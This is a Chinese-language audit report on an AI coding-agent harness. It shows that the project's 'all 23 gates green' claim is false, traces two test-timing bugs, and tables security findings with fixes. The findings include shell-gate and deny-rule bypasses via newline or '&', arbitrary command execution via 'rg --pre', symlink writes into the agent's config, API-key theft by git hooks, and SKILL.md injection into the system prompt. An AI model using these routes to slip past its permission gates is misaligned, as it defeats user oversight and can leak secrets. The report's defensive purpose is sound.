|---|---|---|
| 门数 | 23 道 | 23 道（清单一致 ✅） |
| 结果 | **全绿** | **21 绿 / 2 红（确定性）/ 2 未证** |
| 断言体检 | 零命中 | 零命中 ✅（此项属实） |
| 清单漂移 | 校验通过 | 通过 ✅（此项属实） |

**两项属实、两项证伪**。诚实地说：`AGENTS.md` 关于"体检零命中"与"清单漂移校验通过"的陈述**经实跑确认成立**；被证伪的是"23 道全绿"这个核心结论。

---

#### P0-4a｜`test` 门：`tests/m3c.test.ts` 依赖链用例确定性失败

**实跑证据**：

```
$ node node_modules/vitest/vitest.mjs run --pool=threads --config tests/vitest.config.ts
 FAIL  tests/m3c.test.ts > M3c 依赖链（depends_on 事件驱动） > 前环未收敛 → 延迟登记；前环 done → 后环自动 spawn
AssertionError: expected [ { type: 'agent_result', …(6) } ] to have a length of 2 but got 1
 ❯ tests/m3c.test.ts:413:21
 Test Files  1 failed | 55 passed (56)
      Tests  1 failed | 498 passed (499)
```

（`pnpm gates` 内 `test` 门的输出与此一致：`1 failed | 498 passed`，耗时 106.9s。）

**确定性验证**（单独跑该文件，3 次）：

```
RUN 1  × 前环未收敛 → … 10337ms   Tests 1 failed | 22 passed (23)
RUN 2  × 前环未收敛 → … 10322ms   Tests 1 failed | 22 passed (23)
RUN 3  × 前环未收敛 → … 10301ms   Tests 1 failed | 22 passed (23)
```

三次耗时均 ~10.3s = `waitAll(10_000)` 超时打满 → **确定性失败，不是环境抖动**。

**根因（插桩实验定位，实验后已还原）**：测试在 `:406` 等到 `agent_spawned` 计数为 2 后，立即在 `:407` 释放后环：

```ts
// :406-407
expect(await waitFor(() => events.filter((e) => e.type === "agent_spawned").length === 2)).toBe(true);
hang.get("后环任务B")?.(); // 后环收束
```

`agent_spawned` 只证明**事件已落流**，不证明后环的模型**已被调用并登记释放函数**——后者的链路是 `triggerDeferredSpawn`（`orchestrator.ts:1265` `void …`）→ `await this.spawn()`（`:1280`）→ `void this.runWorker`（`:924`）→ 建工具表/系统提示词/provider → 首次模型调用 → `makeHangModel` 先 yield 一个 `tool_call`（`read_file`）→ 工具执行 → 生成器恢复 → 才 `hang.set(task, …)`（`tests/m3c.test.ts:113-118`）。

插桩输出：

```
[probe] waitFor(spawned===2) 返回后 hang keys = []
[probe] hang.has('后环任务B') = false → 若 false，则下一行 ?.() 静默 no-op
```

`hang` 表此刻**完全是空的**（A 的条目已被 `:405` 的释放删掉），于是 `?.()` 静默 no-op → 后环永不被释放 → `waitAll(10_000)` 空转 → 只有 A 的 `agent_result` → 断言得 1 ≠ 2。

**验证修复**：在 `:407` 前插入 `expect(await waitFor(() => hang.has("后环任务B"))).toBe(true);` → 该用例 **358ms 通过**（对照失败时 10301–10337ms）。**产品行为无误**——`agent_spawned` 确实到了 2，后环确实被 spawn 且确实会登记；坏的只有测试的等待条件。

**性质：临界竞态，非结构性缺陷**（与 P0-4b 不同，这个区别重要）。失败窗口是 `waitFor` 的 25ms 轮询粒度——事件落流后最多 25ms 内必须等到后环模型登记，否则 `?.()` 静默失手。实测本机 3/3 失败（`hang` 表在释放点为**空**），说明这条链路耗时 > 25ms；但**更快的机器上可能通过**。因此 H3-P2 声称的"m3c 87 项回归绿"**未必是假话，但不可复现**——作为验收依据无效。修法是把它从"赌 25ms"改成"等状态"。

**修复已验证**：加上 P0-4b 的 1 行后，`pnpm gates` 回到 **23/23 绿，exit 0**（见 §9.7 实验一）。

**修复**（1 行，且同文件 `:424` 已有正确先例）：

```ts
// :424（下一个用例——作者知道正确做法，只是第一个用例漏了）
expect(await waitFor(() => hang.has("前环任务A"))).toBe(true); // 等前环挂起（消除取消竞态）

// 建议补到 :407 之前
expect(await waitFor(() => hang.has("后环任务B"))).toBe(true);
```

---

#### P0-4b｜`agents-check` 门：D2 快照早于等待 + 崩溃中止后续约 190 条断言

**实跑证据**（`pnpm gates` 内）：

```
  ▶ agents-check …  ❌ agents-check  exit=1  1926ms
      ── 失败输出尾 12 行 ──
        ✅ D1 父 run 返回（turn 结束，worker 仍在后台等审批）
        ❌ D2 approval_requested 落流（agent_id 归因）
        ✅ D3 worker 等审批期间父会话可继续对话（第二 run 成功）
      /Users/ze/Downloads/deepseek harness/scripts/agents-check.ts:317
            cardId: "approval:" + apr!.id,
                                       ^
      TypeError: Cannot read properties of undefined (reading 'id')
```

**确定性验证**（单独跑，3 次）：3/3 同点失败、同点崩溃（每次约 2s）。

**根因（源码复核）**：

```ts
// :303-307 —— 快照取得太早
const runD = await handleAgentRun({ message: "派需要审批的 worker", mode: "default" }, { sessionId: sessionD });
check(runD.ok, "D1 父 run 返回（turn 结束，worker 仍在后台等审批）");   // ← D1 自己就说「worker 仍在后台等审批」
const eventsBeforeDecide = await replay(logD);
const apr = eventsBeforeDecide.find((e) => e.type === "approval_requested") as … | undefined;
check(apr !== undefined && apr.agent_id !== undefined && apr.tool === "read_file", "D2 approval_requested 落流（agent_id 归因）");
...
// :313 —— 正确的等待，但放晚了，且返回值被忽略
await waitForStreamEvent(logD, (e) => e.type === "approval_requested"); // 幂等等待
...
// :317 —— 用 ! 解引用那个已经失败的值 → 崩溃
cardId: "approval:" + apr!.id,
```

**三处叠加缺陷**：

1. **快照早于等待**：`:305-306` 取 `apr` 快照时 worker 的审批还没落流（D1 的断言名自己写着"worker 仍在后台等审批"）。`:313` 的 `waitForStreamEvent` 才是正确做法，但它只等事件、**不重取快照**，所以 `apr` 仍是 `undefined`。
2. **`check` 失败后不短路**：`check` 只累加计数，于是已失败的值继续被使用。
3. **`!` 非空断言把"断言失败"升级为"进程崩溃"**：`apr!.id` 抛 `TypeError`，**中止后续全部断言**。实测崩溃前只打印了 **59 条 ✅**——而项目宣称 `agents-check` 有 **250 条**断言。**约 190 条断言在失败时静默不执行**：门是红的（fail-visible，这点没错），但**覆盖率损失没有任何提示**。

**这是门禁时序缺陷，不是产品缺陷**（主审用耗时反证）：`:313` 的 `waitForStreamEvent` 超时上限是 **15 000ms**，而整个 `agents-check` 只跑了 **1926ms** —— 若该等待曾超时，进程不可能在 1.9s 内走到 `:317`。故 `approval_requested` **确实会落流**，只是晚于 `:305` 的快照。**产品的审批落流行为正常。**

**修复**（3 处，都是小改）：
```ts
// ① 先等再取快照（把 :313 的等待前移到 :305 之前，并断言其结果）
check(await waitForStreamEvent(logD, (e) => e.type === "approval_requested"), "D2a approval_requested 落流（等待成功）");
const apr = (await replay(logD)).find((e) => e.type === "approval_requested") as … | undefined;
// ② 失败即短路，别让后续断言在坏值上跑
if (apr === undefined) { console.log("  ❌ D2 前置失败，跳过 D4–K 段（避免在 undefined 上继续）"); throw new Error("D2 前置失败"); }
// ③ 去掉 `apr!` 的非空断言（它把断言失败升级成崩溃）
```

**修复已验证（见 §9.7 实验一/二）**：只加①这一行，`agents-check` 即 **251 ✅ / 0 ❌ exit=0**——**崩溃后那 192 条断言全部通过，无隐藏失败**。加上 P0-4a 的 1 行后，`pnpm gates` 回到 **23/23 绿，exit 0**。

**缺陷溯源（§9.7 实验三）**：D 段自 `5e3e9b5`（2026-09-12）写下起未被修改；把 `agent-runner.ts` 回退到 H3-P1 之前**仍照样失败** → **不是 H3 引入的回归，而是自始存在**。延迟实测稳定 **56ms**，而原代码在快照点做的是一次 `readFile`（亚毫秒）→ **该断言按原写法永不可能通过**。

**附带建议**：`check` 类辅助函数应提供"致命断言"变体（失败即 `throw`，并显式打印"后续 N 条断言已跳过"），让覆盖率损失**可见**而不是静默。这条对全部 23 道门都适用——本轮实测 `agents-check` 崩溃时**静默跳过了 192/251 条断言（76%）**。

---

#### P0-4 的元问题层面（为什么整体是 P0）

1. **它推翻了项目的"全绿"记录**。`AGENTS.md:46` 写「门禁：`pnpm gates` **23 道全绿** + 恒真式/析取式体检零命中 + 清单漂移校验通过」。实测 **21 绿 / 2 红 / 2 未证**。**"计划全部完成"的验收声明建立在一个不成立的基线上。**
2. **它推翻了 `PROGRESS.md:880` 的结案**：「B2 结案（m3c:406）：…终态树在**双运行时**复验均绿…判定为优化轮并行期部分树 + 沙箱负载的**环境性假红**，**非 src 缺陷**，结案不立项。」——**同一测试在同一棵树上确定性失败**。结案的推理本身也不成立：**单次（或两次）绿跑不能证伪确定性失败**；正确处置应是「修等待条件」，而不是「结案」。
3. **它证明了"零轮询事件驱动"这一 M3c 卖点在门禁层面是失效的**：`waitFor` 只等事件、不等副作用就绪，配合 `?.()` / `!` 把"还没准备好"吞成"什么都不做"或"直接崩溃"。
4. **两道红门的根因是同一个**（见根因 8）：把"事件已发出"当作"状态已就绪"，且失败后不短路。**同一个错误在两个互不相干的验收面各犯一次**，说明它不是笔误，而是这套验收代码的**系统性写法问题**。

**额外记录冲突**：`AGENTS.md:46` 的「51 files / 471 passed」是 `PROGRESS.md:880` 那次结案的基线数字。实测当前树为 **56 文件 / 499 用例**——结案之后套件又长了 5 个文件 / 28 个用例，而基线数字从未更新。这解释了 P1-20 的差异，也说明**"全绿"这个结论至少滞后了一整轮加固（H1/H2/H3）**。

---

## 五、P1 问题详情（20 条）

| # | 区块 | 位置 | 问题 | 证据（主审复核） | 修复 |
|---|---|---|---|---|---|
| P1-1 | A | `events/index.ts:394-397` | `replay` 逐行 `JSON.parse` 无 try/catch：一行半写（崩溃/并发）或 `null`/`123` 这类合法 JSON 非对象行 → 整会话永久不可打开（所有 replay 调用点连锁失败） | `for (const line of raw.split("\n")) { const t = line.trim(); if (!t) continue; events.push(JSON.parse(t) as AgentEvent); }` | 逐行 try/catch + 坏行计数降级 + `typeof parsed === "object"` 校验 |
| P1-2 | A | `compaction.ts:175-176` | `Math.max(-1, ...events.map(...))` 把全量数组展开为函数实参；长会话抛 `RangeError`，而它恰在"会话已很大、正需压缩"时调用；`glm-session.ts:377` 的 `maybeCompact` 无 try/catch → 炸整轮 | `const lastPlanProposed = Math.max(-1, ...events.map((e, i) => (e.type === "plan_proposed" ? eventIdAt(i) : -1)));` | 改单次 `for` 循环记录；`maybeCompact` 包 try/catch |
| P1-3 | B | `orchestrator.ts:860,904,1455` | write worker 文件面/shell 面恒为 `auto` 且 spawn 不检查父档：read-only 父会话仍可 `spawn(mode=write)`，`permission_mode` 记成 `read-only` 后照常以 auto 写 worktree、跑 shell_rw —— §11.7.6"worker ≤ 父"在有效权限上被绕过 | `toolAutonomy: newAutonomySession(mode === "write" ? "auto" : tier)` / `permission_mode: tier` | `spawnInternal` 对 `mode==="write" && 父档 read-only` 直接拒绝，或增记 `effective_write_tier` |
| P1-4 | B | `orchestrator.ts:777,889-890` | 入口只查一次 `aborted`；若 root 在 `await requestSpawnApproval`/`createWorktree`/`emit` 期间中止，`addEventListener` 对已 abort 的 signal 不再触发 → 新 worker 永不被 abort，`runWorker` 一路跑完 | `if (this.root.signal.aborted) {` … `this.root.signal.addEventListener("abort", onRootAbort, { once: true });` | 注册后立即补 `if (this.root.signal.aborted) handle.controller.abort();` |
| P1-5 | C | `permissions/rules.ts:118,145` | `CHAIN_SPLIT` 不认换行：`echo hi\ngit push --force` 归一成一段且不以 `git push` 开头 → 命中不了 deny → auto 档放行（根因 1 的另一半） | `const CHAIN_SPLIT = /\s*(?:&&\|\|\|[;|])\s*/;` / `else if (segment.startsWith(rule.pattern)) len = rule.pattern.length;` | 切分正则加 `\r?\n`；补换行 deny 短路断言 |
| P1-6 | C | `tools/base.ts:105-109` + `write_file.ts:18-19` | `.agent/` 拒写只查**词法** rel 段，realpath 后不复查归属：软链 `foo -> .agent` 即可写 `lsp.json`（任意 command → RCE）或 `permissions.json`（跨会话提权） | `if (typeof rel === "string" && rel.split(/[\\/]/).includes(".agent")) { throw ... }` | realpath 解析落点后，对 `relative(realpath(ws), realpath(abs))` 再做一次 `.agent` 段判定 |
| P1-7 | C | `main/updater.ts:57-62,66` | `stallGuard` 在 fetch 的 `finally` 里就 `dispose`，随后 `await res.text()` 无 signal：更新源发完响应头再挂起 body，IPC 仍永久悬空 | `finally { guard.dispose(); }` … `raw = JSON.parse(await res.text()) as unknown;` | `dispose()` 移到 body 读取完成后 |
| P1-8 | C | `tools/lsp.ts:268-274,244` | `startClient` 的 `spawn` 未传 `detached: true`，`killGroup` 的 `process.kill(-pid)` 找不到进程组只能兜底杀直接子进程 → tsserver 派生孙进程成孤儿 | `const child = spawn(server.command, args, { cwd: root, stdio: [...], env: sanitizedEnv() });` | 加 `detached: true` 或直接复用 `spawnTracked` |
| P1-9 | D | `agent/worktree.ts:42`、`tools/ripgrep.ts:35`、`tools/glob.ts:19`、`agent/map/build.ts:42` | 4 处 `spawn` 不传 `env` 即继承 `process.env`，而 `injectStoredProviderKey` 把**明文 BYOK key** 写进 `process.env.M0_API_KEY`；git 会在工作区仓库执行 `.git/hooks/*` → 恶意 hook 可读走明文 key | `const child = spawn("git", args, { cwd });` / `const child = spawn(rgBinary(), args, { cwd: workspace });` | 4 处统一 `env: sanitizedEnv()`；更彻底：不写 `process.env`，改进程内单例 |
| P1-10 | D | `main/index.ts:219`、`scheduler.ts:373-378` | 全仓无 `app.requestSingleInstanceLock()`：双开时两个 Scheduler 各自把 journal 载入**进程内** `journalKeys` → occurrenceKey 去重跨进程失效 → 同一 due 双触发，且并发写 `automations.json.tmp` 与 journal | `void app.whenReady().then(async () => {`（此前无单实例锁） / `private journalKeys = new Set<string>();` | `whenReady` 前加 `if (!app.requestSingleInstanceLock()) app.quit()` + 处理 `second-instance` |
| P1-11 | E | `plugins/trust.ts:20-21,28,45` | 指纹有 500 文件 / 512KB 双上限：帽外文件与超大文件一律不入指纹 → 攻击者在遍历序第 500 个之后新增/改写恶意文件（含 hooks/MCP 配置），指纹逐字不变 → 复用旧信任，H3-P5 想堵的 E-10 洞未真正堵死 | `const FP_MAX_FILES = 500;` / `if (count >= FP_MAX_FILES) return;` / `if (!st \|\| st.size > FP_MAX_FILE_BYTES) continue;` | 指纹只覆盖"会被加载/执行的文件集"；超帽/超大直接判 `untrusted`（fail-closed），不静默截断 |
| P1-12 | E | `plugins/trust.ts:43` + `manifest.ts:154,162-166` | 指纹 walk 用 `ent.isFile()` 判定，**软链既非 file 也非 dir 被整条跳过**；加载侧用 `exists`(stat)/`readFile` 会跟随软链 → 信任后新增软链 `.mcp.json`：指纹不变却被加载，MCP 可 spawn 任意命令 | `if (!ent.isFile()) continue;` / `} else if (await exists(join(root, "hooks", "hooks.json"))) {` | 指纹 walk 改 `lstat`（记录 target 或直接视为不可信）；加载侧对软链 fail-closed 拒绝 |
| P1-13 | E | `plugins/discover.ts:50-54,263-266` + `index.ts:177` + `agent-runner.ts:913,928` | 项目作用域 `.agent/plugins/` 下无 manifest 但含 SKILL.md 的目录被当"散装 skill"**免信任**加载，其 frontmatter description 随路由清单**直进 system prompt** → 克隆仓库放一个 SKILL.md 即可无审批注入系统提示词 | `} else if (hasSkillMd) { const entry = await loadSkillEntry(null, name, abs); if (entry) loose.push({ name, root: abs, entry }); }` | 项目作用域 loose skill 同走信任门（至少只进 pending、不进 `routingList`）；免信任仅保留给显式 `looseRoots` |
| P1-14 | F | `main.tsx:939-949` + `main/index.ts:129` + `agent-runner.ts:1086-1088` | `agent:event` 是**全局无会话归因**通道（`grep session_id` 显示事件类型里只有 sidechat 用），renderer 无条件折进当前时间线；定时/后台 run 走 `handleAgentRun` 也调 `hooks.onEvent` → 事件串进用户正在看的另一个会话；`scheduler.ts` 全文**无 onEvent**（grep 零命中），即定时 run 无独立路由 | `dispatch({ type: "event", e });` / `push("agent:event", e);` / `onEvent: (e) => { over.onEvent?.(e); hooks.onEvent?.(e); }` | 事件载荷加 `session_id`，renderer 侧只折叠 `session_id === currentSession` 的事件 |
| P1-15 | F | `main.tsx:843-851,925-936` | 会话 `reset` **不收束也不清空** delta 缓冲：切换前缓冲的旧会话 delta 会在 reset 后 flush，合并进新会话时间线；`createSession:854`/`deleteSession:873` 更无 `state.running` 守卫（仅 `switchSession:844` 有） | `const deltaBufRef = useRef<...>([]);`（reset 路径 849/861/887/889/916 均未触碰） | reset 前 `flushDeltaBuf()` + 清 ref/timer；三处会话操作统一加 running 守卫 |
| P1-16 | H | `scripts/compaction-check.ts:30,348` | `unverified` 数组声明后**从不 push**，暗卷跳过（`:321-322` 只打印"暗卷跳过"）不计未证 → 永远输出 `UNVERIFIED=0`、结语打印"全部断言通过"。同类：agents-check M、autonomy-check 任务 7、gate-check 任务 6、sidechat-check F、providers-check ⑥ 跳过时都不打标记 → `gates` 汇总的"未证 N 项"**系统性低报** | `const unverified: string[] = [];` … `console.log("UNVERIFIED=" + String(unverified.length));` | 各门暗卷跳过分支统一 `unverified.push(...)`；加单测断言 `UNVERIFIED=0` 只在真正全跑时出现 |
| P1-17 | H | `scripts/assertion-health.ts:73-81` | 析取扫描只看**固定函数名集合的第一实参**。`tools-check.ts:22`、`prune-check.ts:20`、`map-check.ts:17` 是 label-first 签名 `check(label, cond, ...)`，条件在第二实参 → 其中任何 `\|\|` 弱断言都**扫不到**；`tests/gates-scan.test.ts:44` 只覆盖 cond-first 形态，此盲区无回归测试 | `if (ts.isCallExpression(n) && ts.isIdentifier(n.expression) && ASSERT_NAMES.has(n.expression.text)) { const a0 = n.arguments[0];` | 按每个断言函数**声明签名**定位条件实参（或同时扫所有实参） |
| P1-18 | H | `scripts/plugins-check.ts:540-541` | F10 名为"日志采集非空（扫描位不是空转）"，但紧接一行**无条件 push** 了审计行 → `logLines.length` 必然 ≥1 → 断言恒真。注释宣称"这条扫描不是空转"，实际 F10 本身空转 | `logLines.push("[plugin] userConfig 写入完成：" + JSON.stringify({...}));` / `assert(logLines.length > 0, "F10 日志采集非空（扫描位不是空转）", ...)` | push 前记录 `captured.length`，断言 `captured.length > 0` |
| P1-19 | I | `tests/agents.test.ts:269-277` | 用固定 `setTimeout(120)` 等异步 `approval_requested` 落流，随后直接 `find` 并断言 `apr?.agent_id`；`spawn()` 同步返回后 worker 才异步产审批（`orchestrator.ts:924` `void this.runWorker`），重负载下 120ms 内未落流 → `apr` undefined → **假红** | `await new Promise((res) => setTimeout(res, 120));` / `expect(apr?.agent_id).toBe(agentId);` | 改用同文件已有的轮询式 `waitFor` |
| P1-20 | I | `AGENTS.md:46` vs `tests/` | 宣称"51 files / 471 passed / 0 skipped"，**实跑实测 56 files / 499 tests / 498 passed / 1 failed / 0 skipped**。宣称数字是 `PROGRESS.md:880` 那次结案的基线，滞后了一整轮加固（H1/H2/H3）。**0 skipped 经复核属实**（无 `.skip/.todo/.only`） | `测试 51 files / 471 passed / 0 skipped`；实跑：`Test Files 1 failed \| 55 passed (56)` / `Tests 1 failed \| 498 passed (499)` | 用实跑数字更新 AGENTS.md（详见 P0-4） |

---

## 六、分区块完整问题清单

### 区块 A：Agent 循环内核

覆盖：`loop.ts`(232) `compaction.ts`(597) `prune.ts`(223) `sidechat.ts`(451) `glm-session.ts`(425) `context.ts`(131) `shape.ts`(98) `stuck.ts`(68) `recovery.ts`(50) `gates.ts`(134) `verify.ts`(163) `worktree.ts`(312) `sequencer.ts`(196) `events/index.ts`(440) `frozen.ts`(30)

| # | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议 |
|---|---|---|---|---|---|---|
| A1 | P1 | 正确性/数据丢失 | `events/index.ts:394-397` | `replay` 无容错，一行坏 → 整会话不可打开 | `events.push(JSON.parse(t) as AgentEvent);` | 逐行 try/catch + 坏行降级 |
| A2 | P1 | 正确性/健壮性 | `compaction.ts:175-176` | `Math.max(-1, ...events.map(...))` 全量展开 → 长会话 RangeError | `Math.max(-1, ...events.map((e, i) => ...))` | 改 for 循环 |
| A3 | P2 | 安全/信息外泄 | `sidechat.ts:196-198` | `readAtRef` 只做词法包含校验，不 realpath、不拒软链 → `@` 引用指向 `~/.ssh/id_rsa` 的软链即外泄 | `const rel = relative(resolve(workspace), abs); if (rel === "" \|\| rel.startsWith("..") ...) return null;` | 复用 `assertRealContainment` + lstat 拒软链 |
| A4 | P2 | 性能/O(n²) | `compaction.ts:140-144,182` | `atomicUnits` 对每事件在 `merged` 上 find；`keepFirstSet` 对每 seed 在 `units` 上 find | `const u = merged.find((m) => id >= m.lo && id <= m.hi);` | 与 `buildPruneIndex` 同法预建区间索引 |
| A5 | P2 | 性能/无界重算 | `glm-session.ts:317-326`、`sidechat.ts:231-236` | 每轮 `replay` 全量读盘 + `projectContext` 全量投影（外加 `computePrune`）→ 整会话 O(n²) | `const events = await replay(logPath);` | 增量读取追加段 + 投影缓存 |
| A6 | P2 | 安全/数据丢失 | `worktree.ts:302-305` | `cleanOrphanWorktree` 用目录名拼 git glob 后 `branch -D`：目录名含 `[`/`?` 等 glob 元字符会匹配**全部** agent 分支并循环删除 | `git branch --list "agent/*-" + agentId` | 校验 `agentId` 只含 `[A-Za-z0-9_-]`；用 `for-each-ref` 后按后缀精确匹配 |
| A7 | P2 | 性能/内存 | `worktree.ts:45-50` | `gitRun` 把 stdout/stderr 无上限拼成字符串；`worktreeDiff` 大变更集可产出数百 MB 全驻内存 | `child.stdout?.on("data", (d: Buffer) => { stdout += String(d); });` | 设字节上限 + 超限 kill；diff 先 `--stat` 判规模 |
| A8 | P2 | 健壮性/投毒面 | `events/index.ts:381-384` | `append` 只校验 `type` 在白名单，不校验 payload；`replay` 完全透传 → `{"type":"tool_result"}` 缺 `output` 会一路流进 `serializeConversation` 并在压缩时抛错 | `if (!event \|\| typeof event.type !== "string" \|\| !KNOWN_TYPES.has(event.type)) { throw ... }` | 加轻量 schema 校验；把"未知类型"策略写成显式契约 |
| A9 | P3 | 死代码 | `compaction.ts:234-240` | "最近 typed 用户消息永不吞"兜底分支恒不可达（`keepFirstSet` 已把全部 `user_message` 加入受护集） | `!ctx.keepFirst.has(ctx.lastUserMsgId)` 恒 false | 删死分支，或收窄 keep-first |
| A10 | P3 | 测试强度 | `tests/compaction.test.ts:439-441` | 用"被压事件 JSON 第 1–40 字符"子串不在投影里来断言"已摘除"——39 字符子串本身可能因转义不出现，无法区分"真摘除"与"恰好未命中" | `expect(projText).not.toContain(JSON.stringify(after[id - 1]).slice(1, 40));` | 改用唯一指纹（`tool_call.id`）并加反向断言 |

### 区块 B：多 Agent 编排内核

覆盖：`orchestrator.ts`(2292 全文) `sequencer.ts`(196) + `tests/{m3b,m3c,agents,runscope}.test.ts`

| # | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议 |
|---|---|---|---|---|---|---|
| B1 | **P0** | 安全/权限失效 | `orchestrator.ts:859-860,2196` | worker 自主会话空参构造 → 项目级 deny/ask 规则对 worker 全表失效；注释与实现矛盾 | `autonomy: newAutonomySession(tier),` / `rules: init.rules ?? []` | 传父 run 的 rules/sandboxAvailable |
| B2 | P1 | 安全/档位继承 | `orchestrator.ts:860,904,1455` | write worker 恒 `auto` 且 spawn 不查父档：read-only 父可 `spawn(mode=write)`，记录 read-only 实写 auto | `toolAutonomy: newAutonomySession(mode === "write" ? "auto" : tier)` | 拒绝 read-only 父的 write spawn，或记 `effective_write_tier` |
| B3 | P1 | 并发/取消泄漏 | `orchestrator.ts:777,889-890` | 入口查一次 `aborted`；await 期间 root 中止则新 worker controller 永不 abort | `this.root.signal.addEventListener("abort", onRootAbort, { once: true });` | 注册后补 `if (aborted) abort()` |
| B4 | P2 | 并发上限旁路 | `orchestrator.ts:780,885` | 并发上限 check-then-act：`activeCount()` 与 `workers.set` 间隔多个 await；`void this.triggerDeferredSpawn` 并发触发同一前环的多个后环 → 可突破 `MAX_CONCURRENT_WORKERS=4` | `if (this.activeCount() >= MAX_CONCURRENT_WORKERS) {` … `this.workers.set(agentId, handle);` | 判定处先占位登记，或加 `spawnMutex` |
| B5 | P2 | 安全/脱敏缺口 | `orchestrator.ts:1931-1939,1563-1574` | `scanStreamEvent` 只对 `assistant_message`/`tool_result` 做 `redactSecrets`；worker 的 `tool_call.args`（write_file content）原样落主 JSONL，聚合 diff 快照直接 emit | `if (e.type === "assistant_message") {` / `callId: "diff-" + w.agentId,` | 覆盖 `tool_call`；diff 快照 emit 前脱敏 |
| B6 | P2 | 卡死漏判 | `orchestrator.ts:1480,1451-1460` | `armStuckSilence` 只在收到子流事件时武装；worker 在首个模型调用挂起（无任何事件）则静默规则永不触发 | `this.armStuckSilence(w); // 心跳 = 子流事件天然时间戳` | `runLoop` 前补一次武装 |
| B7 | P2 | 资源回收/内存 | `orchestrator.ts:885,890,1648` | 终态只清 `agentOwners`/`mergeOwners`/`approvalOwners`，`this.workers` 的 handle（含全部 `w.events`）永不删除；每 worker 在 `root.signal` 上加 `once` 监听且从不摘除 → 长会话内存单调增长 | `this.workers.set(agentId, handle);` | 终态 `this.workers.delete(agentId)` + `removeEventListener` |
| B8 | P2 | 并发/血缘一致性 | `orchestrator.ts:2017-2044` | `callIdIndexCache` 是模块级共享可变对象，读区间/`c.offset +=`/`c.lines =` 之间有 await 且无串行化 → 并发 spawn 可能把行号翻倍写入共享 index | `c.offset += consumed;` / `c.lines = lineNo;` | 按 logPath 维护在途 Promise 串行队列 |
| B9 | P2 | 性能/全量重算 | `orchestrator.ts:2250,2267` | worker provider 每轮 `projectContext(opts.readEvents())` 全量重投影，压缩判定再投影一次 → O(n²) | `const msgs = [...opts.system, ...(projectContext(opts.readEvents()) as GlmMessage[])];` | 复用增量投影缓存 |
| B10 | P3 | 纵深防御 | `orchestrator.ts:1739-1744` | `mergeWorker` 自身不校验 `mergeOwners`/收尾态，唯一性依赖路由层 → 公共方法被直接调用时可二次触发 merge | `if (!w \|\| w.mode !== "write" \|\| !w.worktree ...)` | 开头补 `if (!mergeOwners.has(agentId)) return` |

**值得肯定**：①深度恒 1 是**结构性**的（`buildWorkerToolTable` 构造上不放 `spawn_agent` + `runLoop` 白名单硬闸 + 插件 frontmatter 无法放大工具集）；②合并唯一出口三重收口（工具表无 merge/commit + `shell_rw` 按"有效二进制"判定 git 破坏命令 + `commitAndMerge` 单点）；③≥3 worker 压力验收是**真并发**（`waitFor(() => hang.size === 3)` 只在三者同时存活时成立），断言不恒真。

### 区块 C：工具 / 权限门 / 模型适配 / 网络层

覆盖：`src/tools/*`(14) `src/permissions/*`(4) `src/providers/*`(6) `src/net.ts`

| # | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议 |
|---|---|---|---|---|---|---|
| **C0** | **P0** | 安全/任意命令执行 + 任意文件写 | `orchestrator.ts:132-147` | `checkShellSegment` 只校验 `words[0]`/`words[1]`，**参数面从不校验**：`rg --pre=<脚本>` = 任意命令执行；`git log --output=<路径>` = 任意文件写（含工作区外）。6 条危险 flag 实测全部放行（详见 P0-6 / §9.10） | `const head = words[0]!;` … `return null; // ← 之后所有 flag 都不再看` | 放弃字符串白名单改原生只读工具；或走 Seatbelt 只读沙箱 |
| C1 | **P0** | 安全/权限绕过 | `orchestrator.ts:130,156,165-173` | 只读 bash 硬闸不把**换行**与**单与号 `&`** 当命令分隔符 → 任意第二条命令零审批执行（2 个触发实例，详见 P0-1） | `const segments = command.split(/&&\|\|\||;\|\|/);` | 归一化全部 shell 分隔符（`\n`/`\r\n`/`&`）后再切段 |
| C2 | P1 | 安全/权限绕过 | `permissions/rules.ts:118,145` | `CHAIN_SPLIT` 不认换行 → deny 被击穿（详见 P1-5） | `const CHAIN_SPLIT = /\s*(?:&&\|\|\|[;|])\s*/;` | 加 `\r?\n` |
| C3 | P1 | 安全/沙箱逃逸 | `tools/base.ts:105-109` + `write_file.ts:18-19` | `.agent/` 拒写只查词法 rel 段，realpath 后不复查 → 软链可写 `lsp.json`/`permissions.json` | `rel.split(/[\\/]/).includes(".agent")` | realpath 落点复查 |
| C4 | P1 | 健壮性/挂起 | `main/updater.ts:57-62,66` | `stallGuard` 在 fetch finally 就 dispose，`await res.text()` 无 signal → IPC 永久悬空 | `finally { guard.dispose(); }` … `await res.text()` | dispose 移到 body 读完后 |
| C5 | P1 | 资源回收 | `tools/lsp.ts:268-274,244` | `spawn` 无 `detached` → `killGroup` 只能杀直接子进程，语言服务器孙进程成孤儿 | `spawn(server.command, args, { cwd: root, stdio: [...], env: sanitizedEnv() });` | 加 `detached` 或复用 `spawnTracked` |
| C6 | P2 | 功能缺陷 | `tools/lsp.ts:267` | 每个 server arg 都 `resolve(root, a)`，`--stdio` 被改写成 `<root>/--stdio` → 真实语言服务器无法启动 | `const args = (server.args ?? []).map((a) => resolve(root, a));` | `-` 开头的 flag 原样透传 |
| C7 | P2 | 健壮性/断流 | `providers/openai.ts:180`、`anthropic.ts:235`、`gemini.ts:184` | SSE 每行 `JSON.parse` 无 try/catch：一条坏 JSON 行 / 注释心跳 / 非标准 `data:` 载荷即抛错终止整条流 | `const chunk = JSON.parse(payload) as ChatChunk;` | 包 try/catch，坏行跳过（与 `ripgrep.ts:53` 口径统一） |
| C8 | P2 | 计量准确性 | `providers/openai.ts:104` | 请求体未设 `stream_options.include_usage` → OpenAI 兼容端点流式不返回 usage，token 恒 0 | `const body: Record<string, unknown> = { model, messages: toWireMessages(messages), stream };` | stream 时补 `stream_options` |
| C9 | P2 | 可维护性/一致性 | `permissions/index.ts:86-88` vs `autonomy.ts:89-94` | 同名 `isSideEffectTool` 两处实现分叉：autonomy 已按能力域含 `shell_rw`，index.ts 私有版仍只认三个字面名 → loop 路径对 `shell_rw` 不生效（根因 2） | `return tool === "write_file" \|\| tool === "edit_file" \|\| tool === "run_shell";` | 删私有副本，统一从 autonomy 导入 |
| C10 | P2 | 性能/挂起 | `tools/ripgrep.ts:36-41` + `glob.ts:20-23` | rg 全量 stdout 累积成字符串后才 `slice(0,100)`，无超时、无 kill → 大仓库可 OOM 或长挂 | `child.stdout.on("data", (d: string) => { stdout += d; });` | 流式解析 + 达上限即 kill |
